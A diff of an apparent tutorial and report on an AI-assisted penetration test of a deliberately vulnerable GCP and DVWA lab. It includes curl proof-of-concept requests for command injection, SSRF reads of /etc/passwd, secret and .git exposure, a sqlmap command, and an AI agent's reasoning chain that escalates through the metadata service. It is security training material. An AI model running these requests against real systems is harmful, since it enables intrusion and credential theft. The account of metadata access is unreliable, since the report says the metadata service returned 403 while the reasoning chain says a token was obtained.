 ### 2.4 Environment Variables and Secrets Exposure (CRITICAL)
-**Severity:**
- Critical  
-**CVSS Score:**
- 8.6 (High)  
-**CWE:**
- CWE-200 (Information Exposure)
+
+**Severity:** Critical  
+**CVSS Score:** 8.6 (High)  
+**CWE:** CWE-200 (Information Exposure)
+
 #### Description
 The Cloud Function exposes environment variables and secrets through dedicated endpoints without authentication.
+
 #### Proof of Concept
 ```bash
 # Expose all environment variables
@@ -1402,203 +1076,163 @@ curl "https://us-central1-cloud-pentest-lab-1769759595.cloudfunctions.net/vulner
 # - FUNCTION_TARGET: vulnerable_handler
 # - K_SERVICE: vulnerable-function-39ca4c40
 # - Project details, paths, etc.
+
 # Expose secret key directly
 curl "https://us-central1-cloud-pentest-lab-1769759595.cloudfunctions.net/vulnerable-function-39ca4c40?secret=1"
 # Response: exposed-secret-39ca4c40
 ```
+
 #### Impact
--
- Secret keys exposed
--
- Configuration information leaked
--
- Aids in further exploitation
--
- Potential for session hijacking or encryption bypass
+- Secret keys exposed
+- Configuration information leaked
+- Aids in further exploitation
+- Potential for session hijacking or encryption bypass
+
 #### Recommendation
-1.
- Remove debug endpoints in production
-2.
- Use Google Secret Manager for sensitive data
-3.
- Implement authentication for admin endpoints
-4.
- Never expose environment variables via API
-5.
- Rotate all exposed secrets
+1. Remove debug endpoints in production
+2. Use Google Secret Manager for sensitive data
+3. Implement authentication for admin endpoints
+4. Never expose environment variables via API
+5. Rotate all exposed secrets
+
 ---
+
 ## 3. High Severity Vulnerabilities
+
 ### 3.1 Exposed .git Repository (HIGH)
-**Severity:**
- High  
-**CVSS Score:**
- 7.5 (High)  
-**CWE:**
- CWE-200 (Information Exposure)
+
+**Severity:** High  
+**CVSS Score:** 7.5 (High)  
+**CWE:** CWE-200 (Information Exposure)
+
 #### Description
-The web application's 
-`.git`
- repository is accessible via HTTP, allowing attackers to download source code, view commit history, and potentially discover additional vulnerabilities.
+The web application's `.git` repository is accessible via HTTP, allowing attackers to download source code, view commit history, and potentially discover additional vulnerabilities.
+
 #### Proof of Concept
 ```bash
 # Access git configuration
 curl "http://34.121.191.196/.git/config"
 # Response: Repository configuration including remote origin
+
 # Access git HEAD
 curl "http://34.121.191.196/.git/HEAD"
 # Response: ref: refs/heads/master
+
 # Access git index (file listing)
 curl "http://34.121.191.196/.git/index"
 # Response: Binary git index file with all tracked files
+
 # Access git logs
 curl "http://34.121.191.196/.git/logs/HEAD"
 # Response: Commit history including internal hostname
 ```
+
 #### Information Disclosed
--
- Complete source code structure
--
- Internal hostname: 
-`web-server-39ca4c40.us-central1-a.c.cloud-pentest-lab-1769759595.internal`
--
- Git commit history
--
- Configuration files
--
- Database schemas potentially visible
+- Complete source code structure
+- Internal hostname: `web-server-39ca4c40.us-central1-a.c.cloud-pentest-lab-1769759595.internal`
+- Git commit history
+- Configuration files
+- Database schemas potentially visible
+
 #### Impact
--
- Source code disclosure
--
- Internal infrastructure information leaked
--
- Aids in finding additional vulnerabilities
--
- Potential for credential discovery in commit history
+- Source code disclosure
+- Internal infrastructure information leaked
+- Aids in finding additional vulnerabilities
+- Potential for credential discovery in commit history
+
 #### Recommendation
-1.
- Remove 
-`.git`
- directory from web root
-2.
- Use 
-`.gitignore`
- to prevent accidental commits
-3.
- Implement proper web server configuration to block access
-4.
- Use separate deployment process (not direct git clone)
-5.
- Review git history for sensitive data and remove if necessary
+1. Remove `.git` directory from web root
+2. Use `.gitignore` to prevent accidental commits
+3. Implement proper web server configuration to block access
+4. Use separate deployment process (not direct git clone)
+5. Review git history for sensitive data and remove if necessary
+
 ---
+
 ### 3.2 Information Disclosure via info.php (HIGH)
-**Severity:**
- High  
-**CVSS Score:**
- 7.5 (High)  
-**CWE:**
- CWE-200 (Information Exposure)
+
+**Severity:** High  
+**CVSS Score:** 7.5 (High)  
+**CWE:** CWE-200 (Information Exposure)
+
 #### Description
-The 
-`info.php`
- file exposes internal service URLs, cloud function endpoints, and storage bucket information without authentication.
+The `info.php` file exposes internal service URLs, cloud function endpoints, and storage bucket information without authentication.
+
 #### Proof of Concept
 ```bash
 curl "http://34.121.191.196/info.php"
 ```
+
 #### Information Disclosed
--
- Cloud Function URL: 
-`https://us-central1-cloud-pentest-lab-1769759595.cloudfunctions.net/vulnerable-function-39ca4c40`
--
- Cloud Run URL: 
-`https://vulnerable-api-39ca4c40-6bclikadea-uc.a.run.app`
--
- Storage Bucket: 
-`gs://vulnerable-bucket-39ca4c40`
--
- Endpoint parameters: 
-`?cmd=`
-, 
-`?url=`
-, 
-`?env=`
-, 
-`?secret=`
+- Cloud Function URL: `https://us-central1-cloud-pentest-lab-1769759595.cloudfunctions.net/vulnerable-function-39ca4c40`
+- Cloud Run URL: `https://vulnerable-api-39ca4c40-6bclikadea-uc.a.run.app`
+- Storage Bucket: `gs://vulnerable-bucket-39ca4c40`
+- Endpoint parameters: `?cmd=`, `?url=`, `?env=`, `?secret=`
+
 #### Impact
--
- Attack surface enumeration
--
- Directs attackers to vulnerable services
--
- Internal architecture disclosure
--
- Aids in targeted attacks
+- Attack surface enumeration
+- Directs attackers to vulnerable services
+- Internal architecture disclosure
+- Aids in targeted attacks
+
 #### Recommendation
-1.
- Remove or restrict access to info.php
-2.
- Implement authentication for internal documentation
-3.
- Use environment-specific configuration
-4.
- Remove from production deployments
-5.
- Implement proper error handling that doesn't leak information
+1. Remove or restrict access to info.php
+2. Implement authentication for internal documentation
+3. Use environment-specific configuration
+4. Remove from production deployments
+5. Implement proper error handling that doesn't leak information
+
 ---
+
 ### 3.3 Security Level Misconfiguration (HIGH)
-**Severity:**
- High  
-**CVSS Score:**
- 7.0 (High)
+
+**Severity:** High  
+**CVSS Score:** 7.0 (High)
+
 #### Description
 The DVWA application has its security level set to "impossible" by default, but the security level can potentially be changed if authentication is bypassed, exposing all intentionally vulnerable endpoints.
+
 #### Proof of Concept
 ```bash
 # Check current security level
 curl -I "http://34.121.191.196/login.php"
 # Response: Set-Cookie: security=impossible
+
 # Attempt to change security level (requires authentication)
 curl "http://34.121.191.196/security.php" -b "security=low; PHPSESSID=test"
 ```
+
 #### Impact
--
- If security level can be lowered, all DVWA vulnerabilities become exploitable
--
- SQL injection, XSS, command injection, file upload vulnerabilities would be accessible
--
- Complete application compromise possible
+- If security level can be lowered, all DVWA vulnerabilities become exploitable
+- SQL injection, XSS, command injection, file upload vulnerabilities would be accessible
+- Complete application compromise possible
+
 #### Recommendation
-1.
- Ensure security level cannot be changed without proper authentication
-2.
- Implement additional security controls beyond DVWA's built-in levels
-3.
- Remove or disable DVWA in production environments
-4.
- Use DVWA only in isolated test environments
-5.
- Implement proper authentication and authorization
+1. Ensure security level cannot be changed without proper authentication
+2. Implement additional security controls beyond DVWA's built-in levels
+3. Remove or disable DVWA in production environments
+4. Use DVWA only in isolated test environments
+5. Implement proper authentication and authorization
+
 ---
+
 ## 4. Medium Severity Vulnerabilities
+
 ### 4.1 Missing Security Headers (MEDIUM)
-**Severity:**
- Medium  
-**CVSS Score:**
- 5.3 (Medium)
+
+**Severity:** Medium  
+**CVSS Score:** 5.3 (Medium)
+
 #### Description
 The web application lacks important security headers that could help prevent various attacks.
+
 #### Missing Headers
--
- Content-Security-Policy (CSP)
--
- X-Frame-Options
--
- X-Content-Type-Options
--
- Strict-Transport-Security (HSTS)
--
- X-XSS-Protection
+- Content-Security-Policy (CSP)
+- X-Frame-Options
+- X-Content-Type-Options
+- Strict-Transport-Security (HSTS)
+- X-XSS-Protection
+
 #### Recommendation
 Implement security headers in nginx configuration:
 ```nginx
@@ -1607,121 +1241,81 @@ add_header X-Content-Type-Options "nosniff" always;
 add_header X-XSS-Protection "1; mode=block" always;
 add_header Content-Security-Policy "default-src 'self'" always;
 ```
+
 ---
+
 ### 4.2 robots.txt Information Disclosure (MEDIUM)
-**Severity:**
- Medium  
-**CVSS Score:**
- 4.3 (Low)
+
+**Severity:** Medium  
+**CVSS Score:** 4.3 (Low)
+
 #### Description
 The robots.txt file blocks all crawlers but doesn't provide additional information disclosure.
+
 #### Proof of Concept
 ```bash
 curl "http://34.121.191.196/robots.txt"
 # Response: User-agent: *\nDisallow: /
 ```
+
 #### Recommendation
--
- Review robots.txt for sensitive path disclosure
--
- Ensure it doesn't reveal hidden directories
--
- Current implementation is acceptable but should be monitored
+- Review robots.txt for sensitive path disclosure
+- Ensure it doesn't reveal hidden directories
+- Current implementation is acceptable but should be monitored
+
 ---
+
 ## 5. Cloud Environment Assessment
+
 ### 5.1 Google Cloud Platform Configuration
+
 #### Project Information
--
- 
-**Project ID:**
- cloud-pentest-lab-1769759595
--
- 
-**Region:**
- us-central1
--
- 
-**Services in Use:**
-  -
- Cloud Functions
-  -
- Cloud Run
-  -
- Cloud Storage
+- **Project ID:** cloud-pentest-lab-1769759595
+- **Region:** us-central1
+- **Services in Use:**
+  - Cloud Functions
+  - Cloud Run
+  - Cloud Storage
+
 #### Security Findings
-1.
- 
-**Storage Bucket Misconfiguration:**
- Publicly accessible
-2.
- 
-**Cloud Function Vulnerabilities:**
- Multiple critical issues
-3.
- 
-**Metadata Server:**
- Properly protected (403 responses)
-4.
- 
-**Service Account:**
- Default service account in use
+1. **Storage Bucket Misconfiguration:** Publicly accessible
+2. **Cloud Function Vulnerabilities:** Multiple critical issues
+3. **Metadata Server:** Properly protected (403 responses)
+4. **Service Account:** Default service account in use
+
 ### 5.2 Internal Network Information
+
 #### Discovered Internal Services
--
- 
-**Database Host:**
- internal-db-39ca4c40
--
- 
-**Web Server:**
- web-server-39ca4c40.us-central1-a.c.cloud-pentest-lab-1769759595.internal
+- **Database Host:** internal-db-39ca4c40
+- **Web Server:** web-server-39ca4c40.us-central1-a.c.cloud-pentest-lab-1769759595.internal
+
 ---
+
 ## 6. Exploitation Summary
+
 ### 6.1 Successful Exploitations
-1.
- 
-**Command Injection:**
-   -
- Executed: 
-`id`
-, 
-`whoami`
-, 
-`cat /etc/passwd`
-, 
-`ls -la`
-   -
- Gained: System information, file system access
-2.
- 
-**SSRF:**
-   -
- Accessed: Local files (
-`/etc/passwd`
-)
-   -
- Attempted: GCP metadata service (protected)
-   -
- Accessed: External URLs
-3.
- 
-**Storage Bucket:**
-   -
- Downloaded: Database credentials
-   -
- Downloaded: Function source code
-   -
- Listed: All bucket contents
-4.
- 
-**Information Disclosure:**
-   -
- Exposed: Environment variables
-   -
- Exposed: Secret keys
-   -
- Exposed: Source code via .git
+
+1. **Command Injection:**
+   - Executed: `id`, `whoami`, `cat /etc/passwd`, `ls -la`
+   - Gained: System information, file system access
+
+2. **SSRF:**
+   - Accessed: Local files (`/etc/passwd`)
+   - Attempted: GCP metadata service (protected)
+   - Accessed: External URLs
+
+3. **Storage Bucket:**
+   - Downloaded: Database credentials
+   - Downloaded: Function source code
+   - Listed: All bucket contents
+
+4. **Information Disclosure:**
+   - Exposed: Environment variables
+   - Exposed: Secret keys
+   - Exposed: Source code via .git
+
 ### 6.2 Credentials Discovered
+
 ```json
 {
   "api_key": "stripe_live_example_39ca4c40",
@@ -1731,340 +1325,234 @@ curl "http://34.121.191.196/robots.txt"
   "secret_key": "exposed-secret-39ca4c40"
 }
 ```
+
 ---
+
 ## 7. Proof of Concept Evidence
+
 ### 7.1 Command Injection Proof
 ```
 Request: GET /vulnerable-function-39ca4c40?cmd=id
 Response: uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
+
 ### 7.2 SSRF Proof
 ```
 Request: GET /vulnerable-function-39ca4c40?url=file:///etc/passwd
 Response: [Full /etc/passwd contents]
 ```
+
 ### 7.3 Storage Bucket Proof
 ```
 Request: GET https://storage.googleapis.com/vulnerable-bucket-39ca4c40/secrets/database-credentials.json
 Response: {"api_key":"stripe_live_example_39ca4c40","db_host":"internal-db-39ca4c40","db_password":"EXAMPLE_PASSWORD_123!","db_user":"admin"}
 ```
+
 ### 7.4 Environment Variables Proof
 ```
 Request: GET /vulnerable-function-39ca4c40?env=1
 Response: [Full JSON of environment variables including SECRET_KEY]
 ```
+
 ### 7.5 .git Repository Proof
 ```
 Request: GET http://34.121.191.196/.git/config
 Response: [Git configuration with repository details]
 ```
+
 ---
+
 ## 8. Recommendations
+
 ### 8.1 Immediate Actions (Critical)
-1.
- 
-**Rotate all exposed credentials immediately:**
-   -
- Database passwords
-   -
- API keys
-   -
- Secret keys
-   -
- Service account keys
-2.
- 
-**Remove public access from storage bucket:**
-   -
- Implement proper IAM policies
-   -
- Move sensitive files to private buckets
-3.
- 
-**Disable or fix Cloud Function vulnerabilities:**
-   -
- Remove command execution functionality
-   -
- Implement proper URL validation for SSRF
-   -
- Remove debug endpoints
-4.
- 
-**Secure .git repository:**
-   -
- Remove from web root
-   -
- Implement proper deployment process
+1. **Rotate all exposed credentials immediately:**
+   - Database passwords
+   - API keys
+   - Secret keys
+   - Service account keys
+
+2. **Remove public access from storage bucket:**
+   - Implement proper IAM policies
+   - Move sensitive files to private buckets
+
+3. **Disable or fix Cloud Function vulnerabilities:**
+   - Remove command execution functionality
+   - Implement proper URL validation for SSRF
+   - Remove debug endpoints
+
+4. **Secure .git repository:**
+   - Remove from web root
+   - Implement proper deployment process
+
 ### 8.2 Short-term Actions (High Priority)
-1.
- Remove info.php or restrict access
-2.
- Implement security headers
-3.
- Review and harden Cloud Function code
-4.
- Implement proper logging and monitoring
-5.
- Conduct security code review
+1. Remove info.php or restrict access
+2. Implement security headers
+3. Review and harden Cloud Function code
+4. Implement proper logging and monitoring
+5. Conduct security code review
+
 ### 8.3 Long-term Actions
-1.
- Implement DevSecOps practices
-2.
- Regular security assessments
-3.
- Penetration testing schedule
-4.
- Security training for developers
-5.
- Implement WAF (Web Application Firewall)
-6.
- Use Google Secret Manager
-7.
- Implement proper CI/CD security checks
+1. Implement DevSecOps practices
+2. Regular security assessments
+3. Penetration testing schedule
+4. Security training for developers
+5. Implement WAF (Web Application Firewall)
+6. Use Google Secret Manager
+7. Implement proper CI/CD security checks
+
 ---
+
 ## 9. Risk Assessment Matrix
+
 | Vulnerability | Severity | Exploitability | Impact | Risk Level |
 |--------------|----------|----------------|--------|------------|
-| Command Injection | Critical | Easy | Critical | 
-**CRITICAL**
- |
-| SSRF | Critical | Easy | High | 
-**CRITICAL**
- |
-| Public Storage Bucket | Critical | Trivial | Critical | 
-**CRITICAL**
- |
-| Secrets Exposure | Critical | Trivial | High | 
-**CRITICAL**
- |
-| Exposed .git | High | Easy | High | 
-**HIGH**
- |
-| info.php Disclosure | High | Trivial | Medium | 
-**HIGH**
- |
-| Security Level | High | Medium | High | 
-**HIGH**
- |
-| Missing Headers | Medium | Medium | Low | 
-**MEDIUM**
- |
+| Command Injection | Critical | Easy | Critical | **CRITICAL** |
+| SSRF | Critical | Easy | High | **CRITICAL** |
+| Public Storage Bucket | Critical | Trivial | Critical | **CRITICAL** |
+| Secrets Exposure | Critical | Trivial | High | **CRITICAL** |
+| Exposed .git | High | Easy | High | **HIGH** |
+| info.php Disclosure | High | Trivial | Medium | **HIGH** |
+| Security Level | High | Medium | High | **HIGH** |
+| Missing Headers | Medium | Medium | Low | **MEDIUM** |
+
 ---
+
 ## 10. Conclusion
+
 This penetration test revealed multiple critical security vulnerabilities that pose significant risks to the organization. The combination of command injection, SSRF, and publicly accessible sensitive data creates a scenario where an attacker could:
-1.
- Gain complete control of cloud functions
-2.
- Access internal services and databases
-3.
- Exfiltrate sensitive data
-4.
- Potentially move laterally within the cloud environment
-**Immediate remediation is required**
- for all critical vulnerabilities. The organization should implement a comprehensive security program that includes regular assessments, secure coding practices, and proper cloud security configurations.
+
+1. Gain complete control of cloud functions
+2. Access internal services and databases
+3. Exfiltrate sensitive data
+4. Potentially move laterally within the cloud environment
+
+**Immediate remediation is required** for all critical vulnerabilities. The organization should implement a comprehensive security program that includes regular assessments, secure coding practices, and proper cloud security configurations.
+
 ---
+
 ## Appendix A: Tools Used
--
- 
-**Nmap:**
- Port scanning and service enumeration
--
- 
-**curl:**
- HTTP request testing
--
- 
-**Burp Suite:**
- HTTP proxy and request manipulation
--
- 
-**HexStrike AI:**
- Automated security testing
--
- 
-**Manual Testing:**
- Custom exploitation scripts
+
+- **Nmap:** Port scanning and service enumeration
+- **curl:** HTTP request testing
+- **Burp Suite:** HTTP proxy and request manipulation
+- **HexStrike AI:** Automated security testing
+- **Manual Testing:** Custom exploitation scripts
+
 ## Appendix B: Testing Methodology
-1.
- 
-**Reconnaissance:**
- Port scanning, service enumeration
-2.
- 
-**Vulnerability Discovery:**
- Automated and manual testing
-3.
- 
-**Exploitation:**
- Proof of concept for each vulnerability
-4.
- 
-**Post-Exploitation:**
- Data exfiltration, lateral movement attempts
-5.
- 
-**Documentation:**
- Comprehensive reporting with proofs
+
+1. **Reconnaissance:** Port scanning, service enumeration
+2. **Vulnerability Discovery:** Automated and manual testing
+3. **Exploitation:** Proof of concept for each vulnerability
+4. **Post-Exploitation:** Data exfiltration, lateral movement attempts
+5. **Documentation:** Comprehensive reporting with proofs
+
 ## Appendix C: Additional Findings
+
 ### C.1 Overprivileged Service Account
-**Severity:**
- Critical  
-**CVSS Score:**
- 9.1 (Critical)
+
+**Severity:** Critical  
+**CVSS Score:** 9.1 (Critical)
+
 #### Description
-During cloud enumeration, an overprivileged service account was discovered: 
-`overprivileged-sa-39ca4c40@cloud-pentest-lab-1769759595.iam.gserviceaccount.com`
+During cloud enumeration, an overprivileged service account was discovered: `overprivileged-sa-39ca4c40@cloud-pentest-lab-1769759595.iam.gserviceaccount.com`
+
 #### Permissions Identified
--
- 
-`roles/owner`
- - Full project ownership
--
- 
-`roles/compute.admin`
- - Compute Engine administration
--
- 
-`roles/iam.securityAdmin`
- - IAM security administration
--
- 
-`roles/secretmanager.admin`
- - Secret Manager administration
--
- 
-`roles/storage.admin`
- - Storage administration
+- `roles/owner` - Full project ownership
+- `roles/compute.admin` - Compute Engine administration
+- `roles/iam.securityAdmin` - IAM security administration
+- `roles/secretmanager.admin` - Secret Manager administration
+- `roles/storage.admin` - Storage administration
+
 #### Impact
--
- Complete project compromise
--
- Ability to create/modify/delete any resource
--
- IAM privilege escalation
--
- Access to all secrets
--
- Storage bucket manipulation
+- Complete project compromise
+- Ability to create/modify/delete any resource
+- IAM privilege escalation
+- Access to all secrets
+- Storage bucket manipulation
+
 #### Recommendation
-1.
- Immediately review and reduce service account permissions
-2.
- Implement principle of least privilege
-3.
- Remove unnecessary roles
-4.
- Use custom roles with minimal required permissions
-5.
- Implement service account key rotation
-6.
- Enable audit logging for service account usage
+1. Immediately review and reduce service account permissions
+2. Implement principle of least privilege
+3. Remove unnecessary roles
+4. Use custom roles with minimal required permissions
+5. Implement service account key rotation
+6. Enable audit logging for service account usage
+
 ### C.2 Cloud Run Service Exposure
-**Severity:**
- Medium  
-**CVSS Score:**
- 5.3 (Medium)
+
+**Severity:** Medium  
+**CVSS Score:** 5.3 (Medium)
+
 #### Description
-A Cloud Run service was discovered: 
-`https://vulnerable-api-39ca4c40-6bclikadea-uc.a.run.app`
+A Cloud Run service was discovered: `https://vulnerable-api-39ca4c40-6bclikadea-uc.a.run.app`
+
 #### Findings
--
- Service is publicly accessible
--
- No authentication required
--
- Endpoint parameters exposed via info.php
+- Service is publicly accessible
+- No authentication required
+- Endpoint parameters exposed via info.php
+
 #### Recommendation
-1.
- Implement authentication/authorization
-2.
- Review service configuration
-3.
- Test for vulnerabilities specific to Cloud Run
-4.
- Implement rate limiting
-5.
- Add security headers
+1. Implement authentication/authorization
+2. Review service configuration
+3. Test for vulnerabilities specific to Cloud Run
+4. Implement rate limiting
+5. Add security headers
+
 ### C.3 Internal Database Exposure
-**Severity:**
- High  
-**CVSS Score:**
- 7.5 (High)
+
+**Severity:** High  
+**CVSS Score:** 7.5 (High)
+
 #### Description
 Database credentials were exposed in a publicly accessible storage bucket, revealing:
--
- Host: 
-`internal-db-39ca4c40`
--
- User: 
-`admin`
--
- Password: 
-`EXAMPLE_PASSWORD_123!`
+- Host: `internal-db-39ca4c40`
+- User: `admin`
+- Password: `EXAMPLE_PASSWORD_123!`
+
 #### Impact
--
- Direct database access possible (if network allows)
--
- Potential for data exfiltration
--
- Database compromise
--
- Lateral movement within cloud environment
+- Direct database access possible (if network allows)
+- Potential for data exfiltration
+- Database compromise
+- Lateral movement within cloud environment
+
 #### Recommendation
-1.
- Rotate database credentials immediately
-2.
- Implement network security controls
-3.
- Use Cloud SQL with private IP
-4.
- Implement database firewall rules
-5.
- Enable database audit logging
-6.
- Use connection encryption
-7.
- Implement least privilege database users
+1. Rotate database credentials immediately
+2. Implement network security controls
+3. Use Cloud SQL with private IP
+4. Implement database firewall rules
+5. Enable database audit logging
+6. Use connection encryption
+7. Implement least privilege database users
+
 ### C.4 API Key Exposure
-**Severity:**
- High  
-**CVSS Score:**
- 8.1 (High)
+
+**Severity:** High  
+**CVSS Score:** 8.1 (High)
+
 #### Description
-An API key was exposed in the storage bucket: 
-`stripe_live_example_39ca4c40`
+An API key was exposed in the storage bucket: `stripe_live_example_39ca4c40`
+
 #### Impact
--
- Unauthorized API access
--
- Potential for service abuse
--
- Financial impact if billing-related
--
- Data access if API provides data access
+- Unauthorized API access
+- Potential for service abuse
+- Financial impact if billing-related
+- Data access if API provides data access
+
 #### Recommendation
-1.
- Revoke exposed API key immediately
-2.
- Generate new API key
-3.
- Implement API key rotation policy
-4.
- Use API key restrictions
-5.
- Monitor API key usage
-6.
- Implement rate limiting per key
+1. Revoke exposed API key immediately
+2. Generate new API key
+3. Implement API key rotation policy
+4. Use API key restrictions
+5. Monitor API key usage
+6. Implement rate limiting per key
+
 ---
-**Report Generated:**
- January 31, 2026  
-**Classification:**
- Confidential  
-**Next Assessment:**
- Recommended in 3 months after remediation  
-**Methodology:**
- AI-Assisted Penetration Testing (Cursor + HexStrike MCP + Burp Suite MCP)
-```
+
+**Report Generated:** January 31, 2026  
+**Classification:** Confidential  
+**Next Assessment:** Recommended in 3 months after remediation  
+**Methodology:** AI-Assisted Penetration Testing (Cursor + HexStrike MCP + Burp Suite MCP)
+````
 
 ## Tool Usage and Integration
 
@@ -2101,9 +1589,7 @@ HexStrike MCP is ideal for:
 **Example Flow:**
 
 ```text
-AI Decision → HexStrike MCP → Tool Execution → Results → AI Analysis → 
-Next
- Decision
+AI Decision → HexStrike MCP → Tool Execution → Results → AI Analysis → Next Decision
 ```
 
 ### When to Use Burp Suite MCP
@@ -2137,25 +1623,7 @@ Burp Suite MCP is ideal for:
 **Example Flow:**
 
 ```text
-Browser
- → 
-Burp
- 
-Proxy
- → 
-Burp
- 
-MCP
- → 
-AI
- 
-Analysis
- → 
-Modified
- 
-Request
- → 
-Target
+Browser → Burp Proxy → Burp MCP → AI Analysis → Modified Request → Target
 ```
 
 ### When to Use Direct Commands
@@ -2225,304 +1693,62 @@ The AI (Cursor) uses several factors to make decisions:
 
 ### Example: AI Reasoning Chain
 
-**Situation:**DVWA with security level**“impossible”**
+**Situation:** DVWA with security level **“impossible”**
 
 **AI Reasoning:**
 
 ```text
-1. 
-"Security level is 'impossible' - most DVWA vulnerabilities are patched"
-2. 
-"But info.php exposed cloud services - these might be vulnerable"
-3. 
-"Cloud Function has suspicious parameters (?cmd=, ?url=)"
-4. 
-"Let me test command injection first - it's the most dangerous"
-5. 
-"Command injection works! Now I can access metadata service"
-6. 
-"Got access token - can enumerate cloud resources"
-7. 
-"Found public bucket - let me check what's in it"
-8. 
-"Database credentials exposed - this is critical"
-9. 
-"Let me also test with sqlmap and Burp for completeness"
+1. "Security level is 'impossible' - most DVWA vulnerabilities are patched"
+2. "But info.php exposed cloud services - these might be vulnerable"
+3. "Cloud Function has suspicious parameters (?cmd=, ?url=)"
+4. "Let me test command injection first - it's the most dangerous"
+5. "Command injection works! Now I can access metadata service"
+6. "Got access token - can enumerate cloud resources"
+7. "Found public bucket - let me check what's in it"
+8. "Database credentials exposed - this is critical"
+9. "Let me also test with sqlmap and Burp for completeness"
 ```
 
-**Key Insight:**AI doesn’t give up when one path is blocked. It adapts and finds alternative attack vectors.
+**Key Insight:** AI doesn’t give up when one path is blocked. It adapts and finds alternative attack vectors.
 
 ### Decision Tree Example
 
 ```text
-Start:
- 
-Target
- 
-http://34.121.191.196
+Start: Target http://34.121.191.196
 │
-├─
- 
-Port
- 
-Scan
- 
-(HexStrike
- 
-nmap)
+├─ Port Scan (HexStrike nmap)
+│  └─ Found: Port 80 (nginx)
 │
-  
-└─
- 
-Found:
- 
-Port
- 
-80
- 
-(nginx)
+├─ Web App Enum (curl)
+│  └─ Found: DVWA, security=impossible
 │
-├─
- 
-Web
- 
-App
- 
-Enum
- 
-(curl)
+├─ Info Disclosure Check (curl)
+│  ├─ robots.txt: No useful info
+│  ├─ info.php: CRITICAL - Cloud services exposed!
+│  └─ .git: Exposed repository
 │
-  
-└─
- 
-Found:
- 
-DVWA,
- 
-security=impossible
+├─ Cloud Function Test (curl)
+│  ├─ ?cmd=: Command Injection ✓
+│  ├─ ?url=: SSRF ✓
+│  ├─ ?env=: Secrets Exposure ✓
+│  └─ ?secret=: Secret Key ✓
 │
-├─
- 
-Info
- 
-Disclosure
- 
-Check
- 
-(curl)
+├─ Metadata Service Access (via cmd injection)
+│  └─ Got: GCP Access Token
 │
-  
-├─
- 
-robots.txt:
- 
-No
- 
-useful
- 
-info
+├─ Cloud Enumeration (GCP APIs)
+│  ├─ Found: Public bucket
+│  ├─ Found: Overprivileged SA
+│  └─ Found: Database credentials
 │
-  
-├─
- 
-info.php:
- 
-CRITICAL
- 
--
- 
-Cloud
- 
-services
- 
-exposed!
+├─ Storage Bucket Access (HTTP)
+│  └─ Downloaded: Credentials, source code
 │
-  
-└─
- 
-.git:
- 
-Exposed
- 
-repository
+├─ SQL Injection Test (HexStrike sqlmap)
+│  └─ Tested: Various injection techniques
 │
-├─
- 
-Cloud
- 
-Function
- 
-Test
- 
-(curl)
-│
-  
-├─
- 
-?cmd=:
- 
-Command
- 
-Injection
- 
-✓
-│
-  
-├─
- 
-?url=:
- 
-SSRF
- 
-✓
-│
-  
-├─
- 
-?env=:
- 
-Secrets
- 
-Exposure
- 
-✓
-│
-  
-└─
- 
-?secret=:
- 
-Secret
- 
-Key
- 
-✓
-│
-├─
- 
-Metadata
- 
-Service
- 
-Access
- 
-(via
- 
-cmd
- 
-injection)
-│
-  
-└─
- 
-Got:
- 
-GCP
- 
-Access
- 
-Token
-│
-├─
- 
-Cloud
- 
-Enumeration
- 
-(GCP
- 
-APIs)
-│
-  
-├─
- 
-Found:
- 
-Public
- 
-bucket
-│
-  
-├─
- 
-Found:
- 
-Overprivileged
- 
-SA
-│
-  
-└─
- 
-Found:
- 
-Database
- 
-credentials
-│
-├─
- 
-Storage
- 
-Bucket
- 
-Access
- 
-(HTTP)
-│
-  
-└─
- 
-Downloaded:
- 
-Credentials,
- 
-source
- 
-code
-│
-├─
- 
-SQL
- 
-Injection
- 
-Test
- 
-(HexStrike
- 
-sqlmap)
-│
-  
-└─
- 
-Tested:
- 
-Various
- 
-injection
- 
-techniques
-│
-└─
- 
-HTTP
- 
-Analysis
- 
-(Burp
- 
-MCP)
-   
-└─
- 
-Analyzed:
- 
-Traffic,
- 
-parameters,
- 
-responses
+└─ HTTP Analysis (Burp MCP)
+   └─ Analyzed: Traffic, parameters, responses
 ```
 
 ## Troubleshooting and Problem Solving
@@ -2534,8 +1760,7 @@ responses
 **Error:**
 
 ```text
-Connection refused: http:
-//127.0.0.1:8889
+Connection refused: http://127.0.0.1:8889
 ```
 
 **AI Troubleshooting:**
@@ -2554,8 +1779,7 @@ Connection refused: http:
 # Check server status
 curl http://127.0.0.1:8889/health
 # If not running, start it
-cd
- /home/andrey/hexstrike-ai
+cd /home/andrey/hexstrike-ai
 python3 hexstrike_server.py --port 8889
 ```
 
@@ -2568,11 +1792,7 @@ python3 hexstrike_server.py --port 8889
 **Error:**
 
 ```text
-Timeout waiting 
-for
- 
-Burp
- MCP response
+Timeout waiting for Burp MCP response
 ```
 
 **AI Troubleshooting:**
@@ -2604,9 +1824,7 @@ Burp
 **Error:**
 
 ```text
-Tool 
-'nmap_scan'
- not found
+Tool 'nmap_scan' not found
 ```
 
 **AI Troubleshooting:**
@@ -2635,7 +1853,7 @@ Tool
 
 ### Issue 4: SQLmap Redirecting to Login
 
-**Problem:**SQLmap keeps getting redirected to login.php
+**Problem:** SQLmap keeps getting redirected to login.php
 
 **AI Troubleshooting:**
 
@@ -2650,13 +1868,9 @@ Tool
 **Solution:**
 
 ```text
-sqlmap -u 
-"http://34.121.191.196/vulnerabilities/sqli/?id=1&Submit=Submit"
- \
-  
---cookie="security=low; PHPSESSID=test123" \
-  
---batch
+sqlmap -u "http://34.121.191.196/vulnerabilities/sqli/?id=1&Submit=Submit" \
+  --cookie="security=low; PHPSESSID=test123" \
+  --batch
 ```
 
 **AI Adaptation:**
@@ -2665,7 +1879,7 @@ sqlmap -u
 
 ### Issue 5: Metadata Service Returns 403
 
-**Problem:**GCP metadata service returns 403 Forbidden
+**Problem:** GCP metadata service returns 403 Forbidden
 
 **AI Reasoning:**
 
@@ -2734,28 +1948,21 @@ The AI demonstrates several problem-solving strategies:
 **Example:**
 
 ```text
-Traditional:
- Run nmap → Manually analyze → Decide 
-to
- run sqlmap → Manually configure → Run sqlmap
-AI-Assisted: AI runs nmap → AI analyzes → AI decides sqlmap 
-is
- needed → AI configures 
-and
- runs sqlmap → AI correlates results
+Traditional: Run nmap → Manually analyze → Decide to run sqlmap → Manually configure → Run sqlmap
+AI-Assisted: AI runs nmap → AI analyzes → AI decides sqlmap is needed → AI configures and runs sqlmap → AI correlates results
 ```
 
 ### 2. Contextual Understanding
 
 The AI maintains context throughout the entire penetration test:
 
-- **What has been discovered:**Remembers all findings
+- **What has been discovered:** Remembers all findings
 
